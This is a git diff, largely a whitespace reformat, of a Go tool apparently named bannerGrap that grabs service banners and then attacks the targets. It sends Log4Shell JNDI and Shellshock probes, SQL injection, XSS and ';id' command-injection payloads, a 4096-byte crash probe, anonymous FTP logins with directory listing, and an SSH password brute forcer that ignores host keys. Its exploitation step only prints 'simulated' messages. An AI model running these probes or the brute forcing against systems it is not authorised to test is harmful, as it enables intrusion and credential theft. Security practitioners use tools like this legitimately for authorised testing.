+	buf.ReadFrom(resp.Body)
+	return bytes.Contains(buf.Bytes(), []byte("SHELLSHOCK_TEST"))
 }
 
 func probeLog4Shell(host, port string) bool {
-   
-    url := fmt.Sprintf("http://%s:%s/", host, port)
-    client := &http.Client{Timeout: 3 * time.Second}
-    req, err := http.NewRequest("GET", url, nil)
-    if err != nil {
-        return false
-    }
-   
-    req.Header.Set("X-Api-Version", "${jndi:ldap://log4shell-test}")
-    resp, err := client.Do(req)
-    if err != nil {
-        return false
-    }
-    defer resp.Body.Close()
-    buf := new(bytes.Buffer)
-    buf.ReadFrom(resp.Body)
-    return bytes.Contains(buf.Bytes(), []byte("log4shell"))
+
+	url := fmt.Sprintf("http://%s:%s/", host, port)
+	client := &http.Client{Timeout: 3 * time.Second}
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return false
+	}
+
+	req.Header.Set("X-Api-Version", "${jndi:ldap://log4shell-test}")
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	defer resp.Body.Close()
+	buf := new(bytes.Buffer)
+	buf.ReadFrom(resp.Body)
+	return bytes.Contains(buf.Bytes(), []byte("log4shell"))
 }
 
 // CVE/Exploit DB Integration_Regex Matching
 func matchCVEs(banner string) []string {
-    var cves []string
-    cveRegexes := map[string]string{
-        `Apache/2\.4\.49`:      "CVE-2021-41773: Apache 2.4.49 Path Traversal/RCE",
-        `nginx/1\.16\.1`:       "CVE-2019-20372: Nginx 1.16.1 Vulnerability",
-        `Microsoft-IIS/7\.5`:   "CVE-2015-1635: IIS 7.5 HTTP.sys RCE",
-        `OpenSSH_7\.2`:         "CVE-2016-0777: OpenSSH 7.2 Information Leak",
-        `ProFTPD 1\.3\.5`:      "CVE-2015-3306: ProFTPD 1.3.5 Mod_Copy Command Execution",
-        `vsFTPd 2\.3\.4`:       "CVE-2011-2523: vsFTPd 2.3.4 Backdoor",
-        `Exim 4\.87`:           "CVE-2019-10149: Exim 4.87 RCE",
-        `PHP/5\.4`:             "Multiple CVEs: PHP 5.4 End of Life",
-        `Apache Tomcat/9\.0\.0`: "CVE-2017-12617: Tomcat 9.0.0 RCE",
-        `Jetty\(9\.4\.18\.v20190429\)`: "CVE-2019-10241: Jetty 9.4.18 Directory Traversal",
-    }
-    for pattern, desc := range cveRegexes {
-        re := regexp.MustCompile(pattern)
-        if re.MatchString(banner) {
-            cves = append(cves, desc)
-        }
-    }
-    return cves
+	var cves []string
+	cveRegexes := map[string]string{
+		`Apache/2\.4\.49`:              "CVE-2021-41773: Apache 2.4.49 Path Traversal/RCE",
+		`nginx/1\.16\.1`:               "CVE-2019-20372: Nginx 1.16.1 Vulnerability",
+		`Microsoft-IIS/7\.5`:           "CVE-2015-1635: IIS 7.5 HTTP.sys RCE",
+		`OpenSSH_7\.2`:                 "CVE-2016-0777: OpenSSH 7.2 Information Leak",
+		`ProFTPD 1\.3\.5`:              "CVE-2015-3306: ProFTPD 1.3.5 Mod_Copy Command Execution",
+		`vsFTPd 2\.3\.4`:               "CVE-2011-2523: vsFTPd 2.3.4 Backdoor",
+		`Exim 4\.87`:                   "CVE-2019-10149: Exim 4.87 RCE",
+		`PHP/5\.4`:                     "Multiple CVEs: PHP 5.4 End of Life",
+		`Apache Tomcat/9\.0\.0`:        "CVE-2017-12617: Tomcat 9.0.0 RCE",
+		`Jetty\(9\.4\.18\.v20190429\)`: "CVE-2019-10241: Jetty 9.4.18 Directory Traversal",
+	}
+	for pattern, desc := range cveRegexes {
+		re := regexp.MustCompile(pattern)
+		if re.MatchString(banner) {
+			cves = append(cves, desc)
+		}
+	}
+	return cves
 }
 
 func protocolAttacks(host, port, protocol string) []string {
-    var attacks []string
+	var attacks []string
 
-    
-    if protocol == "http" || protocol == "https" {
-       
-        sqlPayload := "' OR '1'='1"
-        url := fmt.Sprintf("http://%s:%s/?id=%s", host, port, sqlPayload)
-        client := &http.Client{Timeout: 3 * time.Second}
-        resp, err := client.Get(url)
-        if err == nil {
-            defer resp.Body.Close()
-            buf := new(bytes.Buffer)
-            buf.ReadFrom(resp.Body)
-            body := buf.String()
-            if strings.Contains(strings.ToLower(body), "sql") || strings.Contains(strings.ToLower(body), "syntax") {
-                attacks = append(attacks, "Possible SQL Injection vulnerability detected")
-            }
-        }
+	if protocol == "http" || protocol == "https" {
 
-       
-        xssPayload := "<script>alert('xss')</script>"
-        url = fmt.Sprintf("http://%s:%s/?q=%s", host, port, xssPayload)
-        resp, err = client.Get(url)
-        if err == nil {
-            defer resp.Body.Close()
-            buf := new(bytes.Buffer)
-            buf.ReadFrom(resp.Body)
-            if strings.Contains(buf.String(), xssPayload) {
-                attacks = append(attacks, "Possible XSS vulnerability detected")
-            }
-        }
+		sqlPayload := "' OR '1'='1"
+		url := fmt.Sprintf("http://%s:%s/?id=%s", host, port, sqlPayload)
+		client := &http.Client{Timeout: 3 * time.Second}
+		resp, err := client.Get(url)
+		if err == nil {
+			defer resp.Body.Close()
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(resp.Body)
+			body := buf.String()
+			if strings.Contains(strings.ToLower(body), "sql") || strings.Contains(strings.ToLower(body), "syntax") {
+				attacks = append(attacks, "Possible SQL Injection vulnerability detected")
+			}
+		}
 
-        
-        cmdPayload := ";id"
-        url = fmt.Sprintf("http://%s:%s/?cmd=%s", host, port, cmdPayload)
-        resp, err = client.Get(url)
-        if err == nil {
-            defer resp.Body.Close()
-            buf := new(bytes.Buffer)
-            buf.ReadFrom(resp.Body)
-            if strings.Contains(buf.String(), "uid=") {
-                attacks = append(attacks, "Possible Command Injection vulnerability detected")
-            }
-        }
-    }
+		xssPayload := "<script>alert('xss')</script>"
+		url = fmt.Sprintf("http://%s:%s/?q=%s", host, port, xssPayload)
+		resp, err = client.Get(url)
+		if err == nil {
+			defer resp.Body.Close()
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(resp.Body)
+			if strings.Contains(buf.String(), xssPayload) {
+				attacks = append(attacks, "Possible XSS vulnerability detected")
+			}
+		}
 
-    
-    if protocol == "ftp" {
-        conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-        if err == nil {
-            defer conn.Close()
-            conn.SetDeadline(time.Now().Add(3 * time.Second))
-            fmt.Fprintf(conn, "USER anonymous\r\n")
-            buf := make([]byte, 1024)
-            n, _ := conn.Read(buf)
-            banner := string(buf[:n])
-            if strings.Contains(banner, "230") {
-                attacks = append(attacks, "FTP Anonymous login allowed")
-            }
-        }
-    }
+		cmdPayload := ";id"
+		url = fmt.Sprintf("http://%s:%s/?cmd=%s", host, port, cmdPayload)
+		resp, err = client.Get(url)
+		if err == nil {
+			defer resp.Body.Close()
+			buf := new(bytes.Buffer)
+			buf.ReadFrom(resp.Body)
+			if strings.Contains(buf.String(), "uid=") {
+				attacks = append(attacks, "Possible Command Injection vulnerability detected")
+			}
+		}
+	}
 
-    
-    conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-    if err == nil {
-        defer conn.Close()
-        payload := strings.Repeat("A", 4096)
-        conn.SetDeadline(time.Now().Add(3 * time.Second))
-        conn.Write([]byte(payload + "\r\n"))
-        buf := make([]byte, 1024)
-        n, _ := conn.Read(buf)
-        if n == 0 {
-            attacks = append(attacks, "Possible buffer overflow (service crashed or closed connection)")
-        }
-    }
+	if protocol == "ftp" {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+		if err == nil {
+			defer conn.Close()
+			conn.SetDeadline(time.Now().Add(3 * time.Second))
+			fmt.Fprintf(conn, "USER anonymous\r\n")
+			buf := make([]byte, 1024)
+			n, _ := conn.Read(buf)
+			banner := string(buf[:n])
+			if strings.Contains(banner, "230") {
+				attacks = append(attacks, "FTP Anonymous login allowed")
+			}
+		}
+	}
 
-    if len(attacks) == 0 {
-        attacks = append(attacks, "No protocol attacks detected")
-    }
-    return attacks
+	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+	if err == nil {
+		defer conn.Close()
+		payload := strings.Repeat("A", 4096)
+		conn.SetDeadline(time.Now().Add(3 * time.Second))
+		conn.Write([]byte(payload + "\r\n"))
+		buf := make([]byte, 1024)
+		n, _ := conn.Read(buf)
+		if n == 0 {
+			attacks = append(attacks, "Possible buffer overflow (service crashed or closed connection)")
+		}
+	}
+
+	if len(attacks) == 0 {
+		attacks = append(attacks, "No protocol attacks detected")
+	}
+	return attacks
 }
 
 func deepProtocolParse(host, port, protocol string) []string {
-    var details []string
+	var details []string
 
-    
-    if protocol == "http" || protocol == "https" {
-        url := fmt.Sprintf("%s://%s:%s/", protocol, host, port)
-        client := &http.Client{Timeout: 3 * time.Second}
-        resp, err := client.Get(url)
-        if err == nil {
-            defer resp.Body.Close()
-            for k, v := range resp.Header {
-                details = append(details, fmt.Sprintf("Header: %s: %s", k, strings.Join(v, ",")))
-            }
-            if resp.TLS != nil {
-                details = append(details, fmt.Sprintf("TLS Version: %x", resp.TLS.Version))
-            }
-        }
-    }
+	if protocol == "http" || protocol == "https" {
+		url := fmt.Sprintf("%s://%s:%s/", protocol, host, port)
+		client := &http.Client{Timeout: 3 * time.Second}
+		resp, err := client.Get(url)
+		if err == nil {
+			defer resp.Body.Close()
+			for k, v := range resp.Header {
+				details = append(details, fmt.Sprintf("Header: %s: %s", k, strings.Join(v, ",")))
+			}
+			if resp.TLS != nil {
+				details = append(details, fmt.Sprintf("TLS Version: %x", resp.TLS.Version))
+			}
+		}
+	}
 
-    
-    if protocol == "ftp" {
-        conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-        if err == nil {
-            defer conn.Close()
-            buf := make([]byte, 1024)
-            n, _ := conn.Read(buf)
-            details = append(details, "FTP Welcome: "+string(buf[:n]))
-        }
-    }
+	if protocol == "ftp" {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+		if err == nil {
+			defer conn.Close()
+			buf := make([]byte, 1024)
+			n, _ := conn.Read(buf)
+			details = append(details, "FTP Welcome: "+string(buf[:n]))
+		}
+	}
 
-    
-    if protocol == "smtp" {
-        conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-        if err == nil {
-            defer conn.Close()
-            buf := make([]byte, 1024)
-            n, _ := conn.Read(buf)
-            details = append(details, "SMTP Banner: "+string(buf[:n]))
-        }
-    }
+	if protocol == "smtp" {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+		if err == nil {
+			defer conn.Close()
+			buf := make([]byte, 1024)
+			n, _ := conn.Read(buf)
+			details = append(details, "SMTP Banner: "+string(buf[:n]))
+		}
+	}
 
-    if len(details) == 0 {
-        details = append(details, "No deep protocol details found")
-    }
-    return details
+	if len(details) == 0 {
+		details = append(details, "No deep protocol details found")
+	}
+	return details
 }
 
 func attemptExploitation(host, port, protocol string, vulns []string) []string {
-    var exploits []string
+	var exploits []string
 
-    for _, v := range vulns {
-        
-        if strings.Contains(v, "Heartbleed") {
-            exploits = append(exploits, "Heartbleed exploitation attempted (simulated)")
-        }
-        
-        if strings.Contains(v, "FTP Anonymous login allowed") {
-            exploits = append(exploits, "Logged in via FTP anonymous account")
-        }
-        
-        if strings.Contains(v, "SQL Injection") {
-            exploits = append(exploits, "SQLi exploitation attempted (simulated)")
-        }
-        
-        if strings.Contains(v, "XSS") {
-            exploits = append(exploits, "XSS exploitation attempted (simulated)")
-        }
-        
-        if strings.Contains(v, "Command Injection") {
-            exploits = append(exploits, "Command Injection exploitation attempted (simulated)")
-        }
-    }
-    if len(exploits) == 0 {
-        exploits = append(exploits, "No exploitation attempted")
-    }
-    return exploits
+	for _, v := range vulns {
+
+		if strings.Contains(v, "Heartbleed") {
+			exploits = append(exploits, "Heartbleed exploitation attempted (simulated)")
+		}
+
+		if strings.Contains(v, "FTP Anonymous login allowed") {
+			exploits = append(exploits, "Logged in via FTP anonymous account")
+		}
+
+		if strings.Contains(v, "SQL Injection") {
+			exploits = append(exploits, "SQLi exploitation attempted (simulated)")
+		}
+
+		if strings.Contains(v, "XSS") {
+			exploits = append(exploits, "XSS exploitation attempted (simulated)")
+		}
+
+		if strings.Contains(v, "Command Injection") {
+			exploits = append(exploits, "Command Injection exploitation attempted (simulated)")
+		}
+	}
+	if len(exploits) == 0 {
+		exploits = append(exploits, "No exploitation attempted")
+	}
+	return exploits
 }
 
 func enumerateService(host, port, protocol string) []string {
-    var enum []string
+	var enum []string
 
-    
-    if protocol == "ftp" {
-        conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-        if err == nil {
-            defer conn.Close()
-            conn.SetDeadline(time.Now().Add(3 * time.Second))
-            fmt.Fprintf(conn, "USER anonymous\r\n")
-            buf := make([]byte, 1024)
-            n, _ := conn.Read(buf)
-            if strings.Contains(string(buf[:n]), "230") {
-                enum = append(enum, "FTP: Anonymous login allowed")
-            }
-            
-            fmt.Fprintf(conn, "PASV\r\n")
-            conn.Read(buf)
-            fmt.Fprintf(conn, "LIST\r\n")
-            n, _ = conn.Read(buf)
-            if n > 0 {
-                enum = append(enum, "FTP: Root directory listing: "+string(buf[:n]))
-            }
-        }
-    }
+	if protocol == "ftp" {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+		if err == nil {
+			defer conn.Close()
+			conn.SetDeadline(time.Now().Add(3 * time.Second))
+			fmt.Fprintf(conn, "USER anonymous\r\n")
+			buf := make([]byte, 1024)
+			n, _ := conn.Read(buf)
+			if strings.Contains(string(buf[:n]), "230") {
+				enum = append(enum, "FTP: Anonymous login allowed")
+			}
 
-    
-    if protocol == "http" || protocol == "https" {
-        client := &http.Client{Timeout: 3 * time.Second}
-        
-        url := fmt.Sprintf("%s://%s:%s/admin", protocol, host, port)
-        resp, err := client.Get(url)
-        if err == nil && resp.StatusCode == 200 {
-            enum = append(enum, "HTTP: /admin found")
-        }
-        
-        url = fmt.Sprintf("%s://%s:%s/login", protocol, host, port)
-        resp, err = client.Get(url)
-        if err == nil && resp.StatusCode == 200 {
-            enum = append(enum, "HTTP: /login found")
-        }
-        
-        url = fmt.Sprintf("%s://%s:%s/robots.txt", protocol, host, port)
-        resp, err = client.Get(url)
-        if err == nil && resp.StatusCode == 200 {
-            enum = append(enum, "HTTP: /robots.txt found")
-        }
-    }
+			fmt.Fprintf(conn, "PASV\r\n")
+			conn.Read(buf)
+			fmt.Fprintf(conn, "LIST\r\n")
+			n, _ = conn.Read(buf)
+			if n > 0 {
+				enum = append(enum, "FTP: Root directory listing: "+string(buf[:n]))
+			}
+		}
+	}
 
-    
-    if protocol == "smtp" {
-        conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
-        if err == nil {
-            defer conn.Close()
-            conn.SetDeadline(time.Now().Add(3 * time.Second))
-            fmt.Fprintf(conn, "EHLO test\r\n")
-            buf := make([]byte, 1024)
-            n, _ := conn.Read(buf)
-            enum = append(enum, "SMTP: "+string(buf[:n]))
-        }
-    }
+	if protocol == "http" || protocol == "https" {
+		client := &http.Client{Timeout: 3 * time.Second}
 
-    if len(enum) == 0 {
-        enum = append(enum, "No enumeration results")
-    }
-    return enum
+		url := fmt.Sprintf("%s://%s:%s/admin", protocol, host, port)
+		resp, err := client.Get(url)
+		if err == nil && resp.StatusCode == 200 {
+			enum = append(enum, "HTTP: /admin found")
+		}
+
+		url = fmt.Sprintf("%s://%s:%s/login", protocol, host, port)
+		resp, err = client.Get(url)
+		if err == nil && resp.StatusCode == 200 {
+			enum = append(enum, "HTTP: /login found")
+		}
+
+		url = fmt.Sprintf("%s://%s:%s/robots.txt", protocol, host, port)
+		resp, err = client.Get(url)
+		if err == nil && resp.StatusCode == 200 {
+			enum = append(enum, "HTTP: /robots.txt found")
+		}
+	}
+
+	if protocol == "smtp" {
+		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), 3*time.Second)
+		if err == nil {
+			defer conn.Close()
+			conn.SetDeadline(time.Now().Add(3 * time.Second))
+			fmt.Fprintf(conn, "EHLO test\r\n")
+			buf := make([]byte, 1024)
+			n, _ := conn.Read(buf)
+			enum = append(enum, "SMTP: "+string(buf[:n]))
+		}
+	}
+
+	if len(enum) == 0 {
+		enum = append(enum, "No enumeration results")
+	}
+	return enum
 }
-
 
 func bruteForceService(host, port, protocol string, userlist, passlist []string) []string {
-    var brute []string
-    if protocol != "ssh" || len(userlist) == 0 || len(passlist) == 0 {
-        return brute
-    }
-    address := net.JoinHostPort(host, port)
-    
-    maxTries := 50
-    tries := 0
-    for _, user := range userlist {
-        for _, pass := range passlist {
-            if tries >= maxTries {
-                brute = append(brute, "Brute force attempt limit reached (max 50 tries per host)")
-                return brute
-            }
-            config := &ssh.ClientConfig{
-                User:            user,
-                Auth:            []ssh.AuthMethod{ssh.Password(pass)},
-                HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-                Timeout:         3 * time.Second,
-            }
-            client, err := ssh.Dial("tcp", address, config)
-            if err == nil {
-                brute = append(brute, fmt.Sprintf("SUCCESS: %s:%s", user, pass))
-                client.Close()
-                return brute 
-            } else if strings.Contains(err.Error(), "unable to authenticate") {
-                
-            }
-            tries++
-        }
-    }
-    if len(brute) == 0 {
-        brute = append(brute, "No valid SSH credentials found")
-    }
-    return brute
-}
+	var brute []string
+	if protocol != "ssh" || len(userlist) == 0 || len(passlist) == 0 {
+		return brute
+	}
+	address := net.JoinHostPort(host, port)
 
+	maxTries := 50
+	tries := 0
+	for _, user := range userlist {
+		for _, pass := range passlist {
+			if tries >= maxTries {
+				brute = append(brute, "Brute force attempt limit reached (max 50 tries per host)")
+				return brute
+			}
+			config := &ssh.ClientConfig{
+				User:            user,
+				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
+				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+				Timeout:         3 * time.Second,
+			}
+			client, err := ssh.Dial("tcp", address, config)
+			if err == nil {
+				brute = append(brute, fmt.Sprintf("SUCCESS: %s:%s", user, pass))
+				client.Close()
+				return brute
+			} else if strings.Contains(err.Error(), "unable to authenticate") {
+
+			}
+			tries++
+		}
+	}
+	if len(brute) == 0 {
+		brute = append(brute, "No valid SSH credentials found")
+	}
+	return brute
+}
 
 func generateReport(r BannerResult) string {
 	report := fmt.Sprintf("Host: %s\nPort: %s\nProtocol: %s\n", r.Host, r.Port, r.Protocol)
@@ -813,8 +787,6 @@ func generateReport(r BannerResult) string {
 	}
 	return report
 }
-
-
 
 func writeHTMLReport(filename string, results []BannerResult) error {
 	const tpl = `
@@ -842,12 +814,10 @@ func writeHTMLReport(filename string, results []BannerResult) error {
 	return t.Execute(f, results)
 }
 
-
 func runPlugins(pluginDir string, r *BannerResult) {
-	
+
 	r.Report += "\n"
 }
-
 
 func getTLSInfo(cs *tls.ConnectionState) (version, cipher, issuer, cn string) {
 	if cs == nil {
@@ -998,7 +968,6 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 	fp := fingerprintBanner(banner)
 	tlsVer, cipher, issuer, cn := getTLSInfo(tlsState)
 
-	
 	vulns := checkVulnerabilities(host, port, protocol, banner)
 	exploits := attemptExploitation(host, port, protocol, vulns)
 	enum := enumerateService(host, port, protocol)
@@ -1022,7 +991,6 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 		Brute:       brute,
 	})
 
-	
 	report += "\nProtocol Attacks: " + strings.Join(attacks, ", ")
 	report += "\nDeep Protocol Parsing: " + strings.Join(deepParse, ", ")
 
@@ -1043,14 +1011,12 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 		Report:      report,
 	}
 
-	
 	if pluginDir != "" {
 		runPlugins(pluginDir, &result)
 	}
 
 	return result
 }
-
 
 func parseTarget(target string) (host, port string) {
 	if strings.HasPrefix(target, "[") {
@@ -1088,7 +1054,6 @@ func readLines(filename string) []string {
 	return lines
 }
 
-
 func main() {
 	asciiArt := `
 __________                                      ________                                        
@@ -1116,6 +1081,7 @@ __________                                      ________
 	brutePasslist := flag.String("brute-passlist", "", "Password list for brute force (optional)")
 	reportHTML := flag.String("report-html", "", "Output HTML report (optional)")
 	pluginDir := flag.String("plugin-dir", "", "Directory for custom plugins/scripts (optional)")
+	//vulns := flag.Bool("vuln", false, "Perform vulnerability scanning based on banner (optional)")
 	flag.Parse()
 
 	if *version {
@@ -1123,7 +1089,6 @@ __________                                      ________
 		os.Exit(0)
 	}
 
-	
 	var targets []string
 	if *targetsFile != "" {
 		file, err := os.Open(*targetsFile)
@@ -1144,15 +1109,15 @@ __________                                      ________
 	}
 	if len(targets) == 0 {
 		fmt.Println(`Usage: go run bannerGrap.go
--> & read these two files of its Usage:
-[i] bannerGrap_Guid or Usage.txt
-[ii] Speacially read this- New_advanced_bashScripts.md 
--> Btw 2nd file i mean New_advanced_bashScripts.md is for version 2.0 speacily but the bannerGrap_Guid or Usage.txt is also important cause in this file it have all usages like basic to aggresive usage..
-[iii] you can use or run this tool like this: 
+        go run bannerGrap.go -h
+
+
+[+] you can use or run this tool like this: [+]
       go build bannerGrap.go 
-	  then run it like this:
+	  [+] then run it like this:
+
 	  ./bannerGrap 
-	  or, ./bannerGrap -f targets.txt -proto http -port 80 -timeout 5 -threads 10 -max 4096 -o output.json -v --brute-userlist users.txt --brute-passlist pass.txt --report-html report.html --plugin-dir plugins/
+	  or, ./bannerGrap -f targets.txt -proto http -port 80 -timeout 5 -threads 10 -max 4096 -o output.json -v --brute-userlist <user wordlist> --brute-passlist <pass wordlist> --report-html report.html --plugin-dir plugins/
 `)
 		flag.PrintDefaults()
 		os.Exit(1)
@@ -1168,7 +1133,6 @@ __________                                      ________
 	overPort := *portFlag
 	timeoutDur := time.Duration(*timeout) * time.Second
 
-	
 	var userlist, passlist []string
 	if *bruteUserlist != "" {
 		userlist = readLines(*bruteUserlist)
@@ -1177,7 +1141,6 @@ __________                                      ________
 		passlist = readLines(*brutePasslist)
 	}
 
-	
 	sem := make(chan struct{}, *threads)
 	var wg sync.WaitGroup
 	results := make([]BannerResult, len(targets))
@@ -1230,7 +1193,6 @@ __________                                      ________
 	}
 	wg.Wait()
 
-	
 	if *output != "" {
 		if strings.HasSuffix(*output, ".json") {
 			f, err := os.Create(*output)
@@ -1270,7 +1232,7 @@ __________                                      ________
 		}
 	}
 	if *output == "" && *reportHTML == "" {
-		
+
 		for _, r := range results {
 			fmt.Printf("%s:%s [%s]\n", r.Host, r.Port, r.Protocol)
 			if r.Error != "" {
